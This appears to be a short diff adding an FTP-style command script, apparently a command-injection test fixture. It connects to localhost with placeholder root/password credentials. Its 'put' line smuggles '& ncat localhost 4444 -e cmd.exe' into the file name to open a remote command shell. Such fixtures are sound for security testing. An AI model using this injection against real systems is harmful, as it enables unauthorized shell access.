@@ -1,0 +1,4 @@
+open 127.0.0.1
+root
+password
+put "file.txt & ncat localhost 4444 -e cmd.exe"
